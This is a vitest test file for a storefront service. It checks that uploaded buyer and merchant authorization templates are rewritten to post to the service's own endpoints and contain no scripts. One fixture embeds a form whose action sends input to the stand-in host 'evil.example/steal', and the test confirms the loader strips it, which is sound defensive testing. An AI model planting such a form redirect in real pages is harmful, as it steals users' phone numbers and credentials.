import { afterEach, describe, expect, it } from "vitest";
import type { ObjectStoragePort } from "../../ports/object-storage";
import { systemClock } from "../../ports/clock";
import { loadAuthorizeAppearance } from "./authorize";
import { bindStorefrontRuntime, resetStorefrontRuntime } from "./runtime";
import { serveStorefront } from "./serve";
import { createMemoryStore } from "./store";

const origin = "https://merclink.example";

describe("authorize appearance loading", () => {
  afterEach(() => {
    resetStorefrontRuntime();
  });

  it("renders the declared step and still serves the static file separately", async () => {
    const store = createMemoryStore();
    const objects = new Map<string, Uint8Array>();
    const buyerHtml = `<template data-merclink="authorize.phone"><form action="https://evil.example/steal"><merclink-slot name="authorize.captcha"></merclink-slot><button id="captcha-send" disabled>发送验证码</button></form></template>`;
    const merchantHtml = `<template data-merclink="authorize.merchant.login"><form><input name="phone"><input name="password"></form></template>`;
    objects.set("buyer-key", text(buyerHtml));
    objects.set("merchant-key", text(merchantHtml));
    bindStorefrontRuntime({
      rateLimit: {
        reserve: () => Promise.reject(new Error("unused")),
        release: () => Promise.resolve({ ok: true }),
      },
      objectStorage: storage(objects),
      clock: systemClock,
      store,
      readOrderStatus: () => Promise.resolve(null),
    });
    store.pointer.activeId = "sfr_auth";
    store.releases.push({
      id: "sfr_auth",
      merchantId: "mch_1",
      sourceKey: "source",
      fallback: null,
      authorizeBuyer: "account/buyer.html",
      authorizeMerchant: "account/merchant.html",
      createdAt: new Date("2026-10-10T00:00:00Z"),
    });
    store.files.push(
      {
        releaseId: "sfr_auth",
        path: "account/buyer.html",
        objectKey: "buyer-key",
        contentType: "text/html",
        byteSize: buyerHtml.length,
      },
      {
        releaseId: "sfr_auth",
        path: "account/merchant.html",
        objectKey: "merchant-key",
        contentType: "text/html",
        byteSize: merchantHtml.length,
      },
    );

    const phone = await loadAuthorizeAppearance({
      kind: "buyer",
      step: "phone",
      notice: "请完成人机验证。",
    });
    expect(phone?.injectCaptcha).toBe(true);
    expect(phone?.html).toContain('action="/authorize/buyer/submit"');
    expect(phone?.html).toContain('id="merclink-authorize-captcha"');
    expect(phone?.html).not.toContain("<script");
    expect(phone?.html).not.toContain("evil.example");
    expect(
      await loadAuthorizeAppearance({ kind: "buyer", step: "code", phone: "13800138000" }),
    ).toBeNull();

    const login = await loadAuthorizeAppearance({ kind: "merchant", step: "login" });
    expect(login?.html).toContain('action="/authorize/merchant/submit"');
    expect(login?.html).toContain('value="login"');

    const file = await serveStorefront("/account/buyer.html", `${origin}/account/buyer.html`);
    expect(file?.status).toBe(200);
    expect(file?.headers.get("location")).toBeNull();
    expect(await file?.text()).toContain('data-merclink="authorize.phone"');
    expect(await serveStorefront("/authorize/buyer", `${origin}/authorize/buyer`)).toBeNull();
  });
});

function text(value: string): Uint8Array {
  return new TextEncoder().encode(value);
}

function storage(objects: Map<string, Uint8Array>): ObjectStoragePort {
  return {
    put: () => Promise.resolve(),
    open: (key) => {
      const bytes = objects.get(key);
      return Promise.resolve(bytes === undefined ? null : { bytes, contentType: "text/html" });
    },
    delete: () => Promise.resolve(),
    headBucket: () => Promise.resolve(),
  };
}
